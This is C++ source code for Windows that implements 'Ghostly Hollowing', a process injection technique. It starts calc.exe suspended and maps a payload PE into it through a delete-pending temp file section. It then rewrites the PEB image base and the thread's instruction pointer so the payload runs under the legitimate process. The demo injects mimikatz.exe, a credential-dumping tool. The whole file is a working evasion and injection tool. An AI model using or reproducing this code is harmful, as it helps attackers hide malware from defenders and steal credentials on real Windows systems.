#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <Memoryapi.h>
#include "Ghostly Hollowing.h"

BOOL CreateLegitProcess(IN PWCHAR imagePath, IN PWCHAR commandLineArgs, OUT PPROCESS_INFORMATION pProcessInformation, IN OUT PHANDLE phStdoutRead, IN OUT PHANDLE phStdoutWrite) {
    // Initialise
    BOOL isSuccess = FALSE;
    DWORD imagePathLen = 0;
    DWORD commandLineArgsLen = 0;
    PWCHAR pCommandLine = NULL;
    
    // Create startup info
    STARTUPINFOW startupInfo;
    RtlZeroMemory(&startupInfo, sizeof(STARTUPINFOW));
    startupInfo.cb = sizeof(STARTUPINFOW);

    //// Create anonymous pipe to capture STDOUT from process
    SECURITY_ATTRIBUTES secAttr;
    RtlZeroMemory(&secAttr, sizeof(SECURITY_ATTRIBUTES));
    secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    secAttr.bInheritHandle = TRUE;
    secAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(phStdoutRead, phStdoutWrite, &secAttr, 0)) goto CLEANUP;
    if (*phStdoutRead == NULL || *phStdoutWrite == NULL) goto CLEANUP;

    startupInfo.hStdOutput = *phStdoutWrite;
    startupInfo.hStdError = *phStdoutWrite;
    startupInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create process
    imagePathLen = lstrlenW(imagePath);
    commandLineArgsLen = lstrlenW(commandLineArgs);
    pCommandLine = (PWCHAR)HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        (1 + imagePathLen + 1 + 1 + commandLineArgsLen + 1) * sizeof(WCHAR) // "imagePath" arg1
    );
    if (pCommandLine == NULL) goto CLEANUP;
    lstrcatW(pCommandLine, L"\"");
    lstrcatW(pCommandLine, imagePath);
    lstrcatW(pCommandLine, L"\" ");
    lstrcatW(pCommandLine, commandLineArgs);

    if(!CreateProcessW(
        imagePath,
        pCommandLine,
        NULL,
        NULL,
        TRUE,
        CREATE_NEW_CONSOLE | CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &startupInfo,
        pProcessInformation
    )) goto CLEANUP;

    // If execution reaches here, all went fine
    isSuccess = TRUE;

CLEANUP:
    // Close write handles; child has already inherited them above
    if(*phStdoutWrite != NULL)
        CloseHandle(*phStdoutWrite);

    if (pCommandLine != NULL)
        HeapFree(GetProcessHeap(), 0, pCommandLine);

    return isSuccess;
}

BOOL CreateGhostSection(IN LPVOID pPePayload, IN DWORD pePayloadSize, IN HANDLE hTargetProcess, OUT VOID **ppPePayloadInTargetBaseAddress) {
    // Initialise
    BOOL isSuccess = FALSE;
    HANDLE hTempFile = NULL;
    DWORD bytesWritten = 0;
    HANDLE hFileMapping = NULL;
    WCHAR tempFile[MAX_PATH] = L"";
    WCHAR tempDir[MAX_PATH] = L"";

    // Create temporary file
    if (GetTempPath2W(MAX_PATH, tempDir) == 0) goto CLEANUP;
    if (GetTempFileNameW(tempDir, L"", 0, tempFile) == 0) goto CLEANUP;

    // Open handle to it
    hTempFile = CreateFileW(
        tempFile,
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );
    if (hTempFile == NULL) goto CLEANUP;

    // Set file to be deleted
    FILE_DISPOSITION_INFO fileDispositionInfo;
    fileDispositionInfo.DeleteFileW = TRUE;
    if(!SetFileInformationByHandle(
        hTempFile,
        FILE_INFO_BY_HANDLE_CLASS::FileDispositionInfo,
        &fileDispositionInfo,
        sizeof(FILE_DISPOSITION_INFO)
    )) goto CLEANUP;

    // Write PE payload to the file
    WriteFile(
        hTempFile,
        pPePayload,
        pePayloadSize,
        &bytesWritten,
        NULL
    );
    if (bytesWritten != pePayloadSize) goto CLEANUP;
    if(!FlushFileBuffers(hTempFile)) goto CLEANUP;

    // Create section backed by the file
    hFileMapping = CreateFileMappingW(
        hTempFile,
        NULL,
        PAGE_READONLY | SEC_IMAGE,
        0,
        0,
        NULL
    );
    if (hFileMapping == NULL) goto CLEANUP;

    // Close file handle
    CloseHandle(hTempFile);
    hTempFile = NULL;

    // Map PE contents to target process
    *ppPePayloadInTargetBaseAddress = MapViewOfFile2(
        hFileMapping,
        hTargetProcess,
        0,
        NULL,
        0,
        0,
        PAGE_READONLY
    );
    if (*ppPePayloadInTargetBaseAddress == NULL) goto CLEANUP;

    // If execution reaches here, all went well
    isSuccess = TRUE;

    // Cleanup
CLEANUP:
    if (hFileMapping != NULL)
        CloseHandle(hFileMapping);

    //// Return success status
    return isSuccess;
}

BOOL HijackProcessExecution(HANDLE hTargetProcess, HANDLE hTargetThread, LPVOID addressOfEntryPoint, LPVOID addressOfImageBase) {
    // Get main thread context
    CONTEXT targetThreadContext;
    RtlZeroMemory(&targetThreadContext, sizeof(CONTEXT));
    targetThreadContext.ContextFlags = CONTEXT_ALL;
    if(!GetThreadContext(hTargetThread, &targetThreadContext)) return FALSE;

    // Patch PEB's BaseAddress
    PPEB_DETAILED pPeb = (PPEB_DETAILED)(targetThreadContext.Rdx);

    DWORD64 numOfBytesWrittenPatchPeb = 0;
    if (!WriteProcessMemory(
        hTargetProcess,
        &(pPeb->ImageBaseAddress),
        &addressOfImageBase,
        sizeof(addressOfImageBase),
        &numOfBytesWrittenPatchPeb
    ) || numOfBytesWrittenPatchPeb != sizeof(LPVOID))
        return FALSE;

    // Patch RIP to point to Entry point
    targetThreadContext.Rip = (DWORD64)addressOfEntryPoint;
    if(!SetThreadContext(hTargetThread, &targetThreadContext)) return FALSE;

    // Resume process
    return (ResumeThread(hTargetThread) == 1);
}

void ReadOutputFromProcess(PHANDLE phStdoutRead) {
    const DWORD bufferSize = 100;
    DWORD dwRead = 0, dwWritten = 0;
    CHAR chBuf[bufferSize] = "";
    BOOL bSuccess = FALSE;
    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    HANDLE hParentStdErr = GetStdHandle(STD_ERROR_HANDLE);

    while(TRUE)
    {
        // Capture child's STDOUT and redirect it to Parent's STDOUT
        bSuccess = ReadFile(*phStdoutRead, chBuf, bufferSize, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) break;

        bSuccess = WriteFile(hParentStdOut, chBuf,
            dwRead, &dwWritten, NULL);
        if (!bSuccess) break;
    }
}

/*
pPePayload: Pointer to buffer containing PE payload
pePayloadSize: Size of above buffer
imagePath: Image path of the legitimate executable to launch
commandLineArgs: Command line args for the injected process
pProcessInformation: Pointer to a PROCESS_INFORMATION that receives output about newly created process
*/
BOOL InvokeGhostlyHollowing(IN LPVOID pPePayload, IN DWORD pePayloadSize, IN PWCHAR imagePath, IN PWCHAR commandLineArgs, OUT PPROCESS_INFORMATION pProcessInformation) {
    // Create legitimate process in suspended mode
    HANDLE hStdoutRead = NULL;
    HANDLE hStdoutWrite = NULL;
    if(!CreateLegitProcess(
        imagePath,
        commandLineArgs,
        pProcessInformation,
        &hStdoutRead,
        &hStdoutWrite
    )) return FALSE;

    // Create ghost section containing PE payload and map to legit process
    LPVOID pPePayloadInTargetBaseAddress = NULL;
    CreateGhostSection(
        pPePayload,
        pePayloadSize,
        pProcessInformation->hProcess,
        &pPePayloadInTargetBaseAddress
    );
    if (pPePayloadInTargetBaseAddress == NULL) return FALSE;

    // Hijack process's execution
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pPePayload;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pPePayload + (pDosHeader->e_lfanew));
    DWORD pePayloadEntrypointOffset = pNtHeader->OptionalHeader.AddressOfEntryPoint;
    if (pePayloadEntrypointOffset == 0) return FALSE;

    if(!HijackProcessExecution(
        pProcessInformation->hProcess,
        pProcessInformation->hThread,
        (PBYTE)pPePayloadInTargetBaseAddress + pePayloadEntrypointOffset,
        pPePayloadInTargetBaseAddress
    )) return FALSE;

    // Read output from process
    ReadOutputFromProcess(&hStdoutRead);

    // Wait for process to finish
    WaitForSingleObject(pProcessInformation->hThread, INFINITE);

    // Cleanup
    CloseHandle(hStdoutRead);
    CloseHandle(pProcessInformation->hThread);
    CloseHandle(pProcessInformation->hProcess);

    return TRUE;
}

int wmain()
{
    // Get PE payload - just for demo
    HANDLE hPePayload = CreateFileW(
        L"C:\\Users\\captainwoof\\source\\repos\\mimikatz\\x64\\mimikatz.exe",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hPePayload == NULL) return GetLastError();

    DWORD pePayloadSizeHigh = 0;
    DWORD pePayloadSizeLow = 0;
    pePayloadSizeLow = GetFileSize(hPePayload, &pePayloadSizeHigh);
    LARGE_INTEGER fileSize;
    fileSize.LowPart = pePayloadSizeLow;
    fileSize.HighPart = pePayloadSizeHigh;

    LPVOID pPePayload = HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        fileSize.QuadPart
    );
    if (pPePayload == NULL) return GetLastError();

    DWORD pePayloadBytesRead = 0;
    if(!ReadFile(hPePayload, pPePayload, fileSize.LowPart, &pePayloadBytesRead, NULL)) return GetLastError();
    if (pePayloadBytesRead != fileSize.LowPart) return GetLastError();

    CloseHandle(hPePayload);
    
    // Invoke injection
    PROCESS_INFORMATION processInformation;
    InvokeGhostlyHollowing(
        pPePayload,
        fileSize.LowPart,
        (PWCHAR)L"C:\\Windows\\System32\\calc.exe",
        (PWCHAR)L"coffee",
        &processInformation
    );

    return 0;
}
